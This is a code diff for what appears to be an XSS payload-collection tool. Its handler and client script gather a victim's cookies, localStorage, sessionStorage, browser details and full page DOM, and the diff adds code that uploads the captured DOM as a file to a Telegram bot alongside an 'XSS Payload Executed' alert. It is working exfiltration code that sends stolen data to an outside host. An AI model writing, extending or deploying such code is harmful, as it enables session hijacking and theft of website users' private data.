@@ -2,10 +2,8 @@ export default async function handler(req, res) {
   if (req.method === 'POST') {
     let data;
     if (req.body.data) {
-      // Form submission
       data = JSON.parse(req.body.data);
     } else {
-      // Direct JSON
       data = req.body;
     }
     
@@ -61,7 +59,9 @@ function collectData() {
   
   try { data.localstorage = JSON.stringify(window.localStorage) || ""; } catch(e) { data.localstorage = ""; }
   try { data.sessionstorage = JSON.stringify(window.sessionStorage) || ""; } catch(e) { data.sessionstorage = ""; }
-  try { data.dom = document.documentElement.outerHTML || ""; } catch(e) { data.dom = ""; }
+  try { 
+    data.dom = document.documentElement.outerHTML || "";
+  } catch(e) { data.dom = ""; }
   
   sendData(data);
 }
@@ -93,14 +93,13 @@ async function sendTelegram(data) {
   let message = `🚨 XSS Payload Executed
 URI: ${data.uri}
 Origin: ${data.origin}
-Cookies: ${data.cookies}
-Referrer: ${data.referrer}
+Cookies: ${data.cookies || 'None'}
+Referrer: ${data.referrer || 'None'}
 User-Agent: ${data['user-agent']}
 Language: ${data.lang}
 GPU: ${data.gpu}
 LocalStorage: ${data.localstorage}
-SessionStorage: ${data.sessionstorage}
-DOM Length: ${data.dom?.length || 0} chars`;
+SessionStorage: ${data.sessionstorage}`;
   
   await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
     method: 'POST',
@@ -110,4 +109,18 @@ DOM Length: ${data.dom?.length || 0} chars`;
       text: message
     })
   });
+
+  // Send DOM as HTML file
+  if (data.dom) {
+    const formData = new FormData();
+    const blob = new Blob([data.dom], { type: 'text/html' });
+    formData.append('document', blob, 'captured_dom.html');
+    formData.append('chat_id', chatId);
+    formData.append('caption', `DOM from ${data.uri}`);
+
+    await fetch(`https://api.telegram.org/bot${botToken}/sendDocument`, {
+      method: 'POST',
+      body: formData
+    });
+  }
 }
